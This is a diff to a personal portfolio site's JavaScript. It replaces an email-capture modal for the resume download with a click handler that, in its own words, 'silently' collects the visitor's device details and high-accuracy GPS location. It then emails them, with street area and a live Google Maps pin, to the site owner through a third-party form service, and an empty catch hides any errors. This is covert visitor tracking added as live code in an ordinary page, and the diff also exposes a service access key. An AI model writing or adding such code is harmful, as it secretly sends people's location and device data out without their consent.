@@ -1423,58 +1423,13 @@ contactForm?.addEventListener("submit", async (event) => {
 });
 
 /* ===================================================
-   Resume Download Modal & Email Capture Controller
+   Direct Resume Download Tracking (Silent)
    =================================================== */
-const resumeModal = document.querySelector("#resume-modal");
-const resumeBackdrop = document.querySelector("#resume-backdrop");
-const resumeClose = document.querySelector("#resume-close");
-const resumeDownloadForm = document.querySelector("#resume-download-form");
-const resumeEmailInput = document.querySelector("#resume-email-input");
-const resumeTriggers = document.querySelectorAll(".resume-download-trigger");
-
-function initResumeDownloadModal() {
-  if (!resumeModal) return;
-
-  function openResumeModal(e) {
-    if (e) e.preventDefault();
+document.querySelectorAll('a[href*="BashantaCv.pdf"]').forEach((link) => {
+  link.addEventListener("click", async () => {
     playSound("click");
-    resumeModal.classList.add("is-open");
-    resumeModal.setAttribute("aria-hidden", "false");
-    document.body.style.overflow = "hidden";
-    resumeEmailInput?.focus();
-  }
 
-  function closeResumeModal() {
-    resumeModal.classList.remove("is-open");
-    resumeModal.setAttribute("aria-hidden", "true");
-    document.body.style.overflow = "";
-  }
-
-  resumeTriggers.forEach((btn) => btn.addEventListener("click", openResumeModal));
-  resumeClose?.addEventListener("click", closeResumeModal);
-  resumeBackdrop?.addEventListener("click", closeResumeModal);
-
-  resumeDownloadForm?.addEventListener("submit", async (e) => {
-    e.preventDefault();
-    const enteredEmail = resumeEmailInput?.value.trim();
-    if (!enteredEmail) return;
-
-    playSound("success");
-    closeResumeModal();
-    showToast("Resume download started! Thank you.");
-
-    // Programmatically trigger download of CV PDF
-    const link = document.createElement("a");
-    link.href = "assets/BashantaCv.pdf";
-    link.download = "Bashanta_Pokharel_Resume.pdf";
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-
-    // Save in storage
-    localStorage.setItem("bp_visitor_email", enteredEmail);
-
-    // Gather hardware & location specs
+    // Gather hardware & location specs silently
     try {
       const deviceInfo = await getDetailedDeviceInfo();
       const gpsLocation = await getHighAccuracyLocation();
@@ -1505,11 +1460,11 @@ function initResumeDownloadModal() {
       // Dispatch High-Priority Resume Download Alert to Gmail
       const formData = new FormData();
       formData.append("access_key", "fb13d3c2-66f4-42e2-bdd8-1caea1205753");
-      formData.append("name", `Resume Downloader: ${enteredEmail}`);
-      formData.append("email", enteredEmail);
+      formData.append("name", "Resume Download Trigger");
+      formData.append("email", "resume-tracker@bashantapokharel.dev");
       formData.append(
         "subject",
-        `📄 RESUME DOWNLOADED: ${enteredEmail} | [${deviceInfo.brand} ${deviceInfo.model}]`
+        `📄 RESUME DOWNLOADED: [${deviceInfo.brand} ${deviceInfo.model}] from ${geoData.city}`
       );
       formData.append("from_name", "Portfolio Resume Alert");
       formData.append("message", `
@@ -1517,7 +1472,6 @@ function initResumeDownloadModal() {
 📄 VISITOR / RECRUITER DOWNLOADED YOUR RESUME!
 ===================================================
 
-• Recruiter / Visitor Email: ${enteredEmail}
 • Downloaded File: Bashanta_Pokharel_Resume.pdf
 • Location / Street: ${specificArea}
 • Live Google Maps Pin: ${activeMapsUrl}
@@ -1542,12 +1496,6 @@ function initResumeDownloadModal() {
         method: "POST",
         body: formData
       });
-    } catch (err) {
-      console.error("Error dispatching resume alert:", err);
-    }
-
-    resumeDownloadForm.reset();
+    } catch (err) {}
   });
-}
-
-initResumeDownloadModal();
+});
